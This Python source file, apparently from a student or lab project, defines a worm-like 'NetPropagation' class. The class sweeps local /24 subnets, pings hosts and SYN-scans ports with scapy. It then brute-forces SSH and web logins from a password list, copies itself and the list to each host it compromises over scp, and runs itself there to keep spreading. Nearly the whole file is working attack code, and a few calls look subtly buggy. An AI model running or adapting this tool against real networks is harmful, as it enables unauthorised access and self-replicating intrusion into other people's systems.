#!/usr/bin/python3

# Author: @andrewk10

# Importing paramiko modules for SSH connection and exception handling.
from paramiko import SSHClient, RejectPolicy
from paramiko.ssh_exception import NoValidConnectionsError, SSHException
# Importing modules from scapy for Packet Crafting and Sending / Sniffing.
from scapy.all import get_if_addr
from scapy.interfaces import get_if_list
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr
from scapy.utils import subprocess, os
# Try to import modules uniquely, otherwise use scapy.all in the meantime
# from scapy.all import *
# Importing sleep to allow network processes time to complete.
from time import sleep
# Importing logging to safely log sensitive, error or debug info.
import logging
# Importing pipes for the piping for certain processes
import pipes
# Importing requests for web based operations.
import requests
# Importing strings for use of the external strings resources.
import strings
# Importing strings_functions for string building functions.
import strings_functions


class NetPropagation:
    """
    This class deals with net propagation related operations.
    """

    def __init__(self, username, password, ip, port, interface, ip_list,
                 password_list):
        """
        Object parameters being initialised
        :param username: The user we wish to propagate under
        :param password: The password being used for propagation
        :param ip: The IP address of the target machine
        :param port: The port of the target machine
        :param interface: The interface on which we wish to carry out actions
        :param ip_list: A list of IP addresses on which we wish to carry out
        actions
        :param password_list: A list of password on which we wish to use for
        actions
        """
        self.username = username
        self.password = password
        self.ip = ip
        self.port = port
        self.interface = interface
        self.ip_list = ip_list
        self.password_list = password_list

    def additional_actions(self, transfer_file, propagation_script, arguments):
        """
        This function passes the appropriate arguments to and runs the
        transferring file and propagating functions, these functions contain
        the check to stop them from being run if the appropriate arguments
        aren't used
        :param transfer_file: The file that will be transferred upon user
        request
        :param propagation_script: The script that will be propagated upon user
        request
        :param arguments: Arguments passed in by the user themselves
        """
        transfer_file.check_transfer_file(arguments, self.ip, self.port,
                                          self.username)
        self.propagating(propagation_script, arguments)

    def check_over_ssh(self, filename):
        """
        This function checks if a given file is already located at the target
        machine over SSH. If it is then false is returned and if not then true
        is returned. This is needed as a prerequisite to propagating over SSH
        :param filename: The filename that we are checking for, can contain a
        path
        :return True: If the file doesn't exist on the target host or there's a
        problem with SSH (assuming file isn't present essentially)
        :return False: If the file does exist
        """
        client = SSHClient()
        try:
            client.set_missing_host_key_policy(RejectPolicy)
            client.connect(hostname=str(self.ip), port=int(self.port),
                           username=str(self.username), password=str(
                    self.password), timeout=2)
            client.exec_command(pipes.quote(strings_functions.touch_file(
                filename)))

            if str(client.exec_command(pipes.quote(strings_functions.cat_file(
                    filename)))[1]).__len__() < 1:
                client.close()
                return True

        except NoValidConnectionsError:
            client.close()
            return True

        except TimeoutError:
            client.close()
            return True

        except SSHException:
            client.close()
            return True

    def connect_ssh_client(self):
        """
        This function checks to see if an SSH connection can be established
        and if so then it returns true, if not then it returns false
        :return True: If the SSH connect is successful
        :return False: If the SSH connect is unsuccessful
        """
        client = SSHClient()
        try:
            client.set_missing_host_key_policy(RejectPolicy)
            client.connect(hostname=str(self.ip), port=int(self.port),
                           username=str(self.username), password=str(
                    self.password), timeout=2)
            client.close()
            logging.info(strings_functions.connection_status(
                strings.SSH, self.ip, self.port, strings.SUCCESSFUL))
            return True

        except SSHException:
            client.close()
            logging.debug(strings_functions.connection_status(
                strings.SSH, self.ip, self.port, strings.UNSUCCESSFUL))
            return False

        except NoValidConnectionsError:
            client.close()
            logging.debug(strings_functions.connection_status(
                strings.SSH, self.ip, self.port, strings.UNSUCCESSFUL))
            return False

        except TimeoutError:
            client.close()
            logging.debug(strings_functions.connection_status(
                strings.SSH, self.ip, self.port, strings.UNSUCCESSFUL))
            return False

    def connect_web(self):
        """
        This function check to see if a web login can be established and if so
        then it returns true, if not then it returns false
        :return True: If the web login is successful
        :return False: If the web login connect is unsuccessful
        """
        attempt_succeeded = False
        try:
            self.send_post_request_with_login()
            attempt_succeeded = True
        except RuntimeError:
            logging.debug(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.UNSUCCESSFUL))
            return attempt_succeeded
        except requests.exceptions.ConnectTimeout:
            logging.debug(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.UNSUCCESSFUL))
            return attempt_succeeded
        except requests.exceptions.ConnectionError:
            logging.debug(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.UNSUCCESSFUL))
            return attempt_succeeded
        if attempt_succeeded:
            logging.info(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.SUCCESSFUL))
        return attempt_succeeded

    def cycle_through_subnet(self):
        """
        This function takes in a given network interface and an IP list, it
        will get the IP address of the interface and add all the address from
        its /24 subnet to the IP list.
        """
        interface_split = get_if_addr(self.interface).split(strings.FULL_STOP)
        last_byte = 0
        while last_byte < 256:
            specific_address = str(interface_split[0]) + strings.FULL_STOP \
                               + str(interface_split[1]) + strings.FULL_STOP \
                               + str(interface_split[2]) + strings.FULL_STOP \
                               + str(last_byte)
            if not self.ip_list.__contains__(specific_address):
                logging.info(strings_functions.adding_address_to_interface(
                    specific_address,
                    self.interface))
                if self.ip_list:
                    self.ip_list.append(specific_address)
                else:
                    self.ip_list = [specific_address]
            last_byte = last_byte + 1

    def gathering_local_ips(self):
        """
        This function will cycle through all local interfaces outside the
        loopback interface and will add their /24 subnets to the IP list
        :return ip_list: The IP list with the newly found subnet addresses
        """
        logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
        local_interfaces = get_if_list()
        if strings.LOOPBACK in local_interfaces:
            local_interfaces.remove(strings.LOOPBACK)
        for interface in local_interfaces:
            self.interface = interface
            logging.info(strings_functions.fetching_ips_for_interface(
                interface))
            self.cycle_through_subnet()

    def is_reachable_ip(self):
        """
        This function checks to see if an IP is reachable and returns true if
        it is and false if it isn't
        :return True: If the IP address is reachable
        :return False: If the IP address is not reachable
        """
        try:
            command = [strings.PING, strings.PING_ARGUMENT, strings.ONE, str(
                self.ip)]
            if subprocess.call(command) == 0:
                logging.info(strings_functions.ip_reachability(self.ip, True))
                return True
            logging.debug(strings_functions.ip_reachability(self.ip, False))
            return False
        except FileNotFoundError:
            logging.debug(strings.PING_CMD_NOT_FOUND)
            return False

    def propagate_script(self, script):
        """
        This function is responsible for propagating a given script to a
        previously accessed machine. It will only run when the user specifies
        using the appropriate argument and when the port being used is 22
        (SSH), it will also check to ensure the script isn't  already present
        on the target. It goes about propagating the script in different ways
        depending on if an SSH port is specified
        :param script: The script to be propagated and ran on another machine
        service used
        :return True: If the script is successfully propagated here
        :return False: If the script is not successfully propagated here
        """
        try:
            if script.file_not_exist(self.ip, self.port, self.username,
                                     self.password):
                print(strings.RSA_AND_PROMPT)
                os.system(strings_functions.scp_command_string(
                    self.port, self.username, self.password, os.path.basename(
                        __file__)))
                print(strings.RSA_PROMPT_AGAIN)
                os.system(strings_functions.scp_command_string(
                    self.port, self.username, self.ip, strings.PWDS_LIST))
                client = SSHClient()
                try:
                    client.set_missing_host_key_policy(RejectPolicy)
                    client.connect(hostname=str(self.ip), port=int(self.port),
                                   username=str(self.username),
                                   password=str(self.password), timeout=2)
                    if strings_functions.run_script_command() == \
                            "./demo.py -L -p 22 -u " \
                            "root -f " \
                            "src/test_files/" \
                            "passwords_list.txt -P":
                        client.exec_command(pipes.quote(
                            strings_functions.run_script_command()))
                    else:
                        logging.error(strings.SANITATION_FAILED)
                        client.close()
                        return False
                    return True
                except RuntimeError:
                    client.close()
                    return False
                except TimeoutError:
                    client.close()
                    return False
                except SSHException:
                    client.close()
                    return False

            else:
                logging.debug(strings_functions.file_present_on_host(self.ip))
                return False
        except RuntimeError:
            return False
        except NoValidConnectionsError:
            return False

    def propagating(self, script, arguments):
        """
        This function attempts propagation of a given script over the network.
        If it succeeds we alert the user and let them know what service was
        successful. If it is unsuccessful then we let the user know it was
        unsuccessful and over what service. Should the user have never asked
        for the script to be propagated over the network then we let them know
        this part of the process will not be done
        :param script: The script that needs to be propagated and spread
        :param arguments: The arguments passed in by the user themselves
        """
        if arguments.propagate and (
                self.port == strings.SSH_PORT):
            propagated = self.propagate_script(script)
            if propagated:
                logging.info(strings.SCRIPT_PROPAGATED)
            else:
                logging.debug(strings.SCRIPT_NOT_PROPAGATED)
        else:
            logging.info(strings.DO_NOT_PROPAGATE)

    def remove_unreachable_ips(self):
        """
        This function will try and ping every IP in the IP list and if it
        doesn't receive a response it will then remove that IP from the IP list
        """
        if self.ip_list:
            for ip in self.ip_list:
                self.ip = ip
                logging.info(strings_functions.checking_ip_reachable(ip))
                if not self.is_reachable_ip():
                    self.ip_list.remove(self.ip)

    def scan_port(self):
        """
        This function will scan a port to see if it is open. If the port is
        open then it will return true and if it is not then it will return
        false
        :return True: The port is open
        :return False: The port is not open
        """
        if isinstance(self.ip, str) and isinstance(self.port, str):
            ip_header = IP(dst=self.ip)
            tcp_header = TCP(dport=int(self.port), flags=strings.SYN_FLAG)
            packet = ip_header / tcp_header
            try:
                response, unanswered = sr(packet, timeout=2)
                # Needed to process the response
                sleep(1)
                if len(response) > 0:
                    return True
            except PermissionError:
                logging.error(strings.PERMISSIONS_ERROR)
        return False

    def send_post_request_with_login(self):
        """
        This function sends a post request to a web server in an attempt to
        bruteforce its login details. If it succeeds with the given arguments
        then it will return the successful string of details, if not then it
        will return Null
        """
        response = requests.post(strings_functions.web_login_url(
            self.ip, self.port),
            data={strings.USERNAME_PROMPT_WEB: self.username,
                  strings.PASSWORD_PROMPT_WEB: self.password},
            timeout=2)
        if response:
            logging.info(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.SUCCESSFUL))
            return str(self.username) + strings.COLON + str(self.password)
        logging.debug(strings_functions.connection_status(
            strings.WEB, self.ip, self.port, strings.UNSUCCESSFUL))
        return None

    def sign_in_service(self):
        """
        This function will run through every password in the password list and
        will attempt to sign in to the appropriate service with that password.
        It will only move on to the next password in the event that the current
        password fails in its sign in attempt. If it succeeds then the
        successful login details are returned, if not then Null is returned
        :return login_details: The username and password to return
        :return None: Only done to indicate an unsuccessful task
        """
        for password in self.password_list:
            self.password = password
            login_details = self.try_password_for_service()
            if login_details is not False:
                return login_details
        return None

    def try_action(self, transfer_file, script, arguments):
        """
        This function will attempt a sign in action across various services
        depending on the ip or port supplied (if the port is open on that IP),
        it iterates through the password list when you sign in to the
        appropriate service associated with the port number supplied. If the
        sign in action is successful it will then check the need for additional
        actions specified by the end user
        :param transfer_file: A file to be transferred
        :param script: A script to be transferred and executed
        :param arguments: List of user specified arguments
        """
        if self.scan_port():
            logging.info(strings.FOUND_OPEN_IP_PORT_PAIR)
            action_login_details = self.try_sign_in()
            if action_login_details[0]:
                self.additional_actions(transfer_file, script, arguments)
        else:
            logging.debug(strings.CLOSED_IP_PORT_PAIR)

    def try_password_for_service(self):
        """
        This function tries to log into to a port's associated service using a
        specific username and password pair. If it succeeds it returns the
        successful login string, otherwise it returns an empty string
        :return str(username) + ":" + str(password): The successful username
        and password combination
        :return "": Empty string for unsuccessful username and password
        combination
        """
        try:
            if self.port is strings.SSH_PORT and self.connect_ssh_client():
                return str(self.username) + strings.COLON + str(self.password)
            if (self.port is strings.WEB_PORT_EIGHTY or self.port is
                strings.WEB_PORT_EIGHTY_EIGHTY or self.port is
                strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT) and \
                    self.connect_web():
                return str(self.username) + strings.COLON + str(self.password)
            return False
        except RuntimeError:
            return False

    def try_sign_in(self):
        """
        This function will try to sign in to a specific service depending on
        the port supplied. If it gets a successful login then it will return
        the login details and the service used, otherwise it returns none as
        the login
        details along with the service used
        :return str(sign_in_details), service: The username and password of a
        successful action with the service used
        :return None, service: Empty username and password for an unsuccessful
        action and the service which was used.
        """
        service_switch = {
            strings.SSH_PORT: strings.SSH_LOWERCASE,
            strings.WEB_PORT_EIGHTY: strings.WEB_LOGIN,
            strings.WEB_PORT_EIGHTY_EIGHTY: strings.WEB_LOGIN,
            strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: strings.WEB_LOGIN
        }
        service = service_switch.get(str(self.port))
        sign_in_details = self.sign_in_service()
        if sign_in_details:
            logging.info(strings_functions.working_username_password(service))
            return str(sign_in_details), service
        logging.debug(strings.IMPOSSIBLE_ACTION)
        return None, service
